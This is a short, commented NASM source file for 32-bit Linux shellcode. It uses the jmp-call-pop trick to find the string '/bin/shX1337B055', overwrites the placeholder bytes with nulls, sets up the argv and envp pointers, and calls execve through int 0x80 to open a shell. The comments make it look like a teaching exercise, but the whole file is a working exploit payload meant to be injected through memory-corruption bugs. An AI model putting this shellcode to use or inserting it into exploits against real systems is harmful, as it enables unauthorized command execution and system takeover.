BITS 32
	jmp short part_two ;this is a call trick to get the string pointer address
; on the stack

part_one:
;; int execve(const char fname, char *const argv[], char *const envp[] )
	pop ebx	; ebx has the addr of our string
	xor eax, eax	;put 0 into eax
	mov [ebx+7], al	; replace the 'X' in the string with 8-bit of zero
	mov [ebx+8], ebx ; put addr from ebx where the '1337' is
	mov [ebx+12], eax ; put 32-bit null terminator where the 'B055' is
	lea ecx, [ebx+8] ; load the addr of [ebx+8] into ecx( argv ptr)
	lea edx, [ebx+12] ; edx = ebx+12 (env ptr =null)
	mov al, 11
	int 0x80

part_two:
	call part_one
	db '/bin/shX1337B055' ;

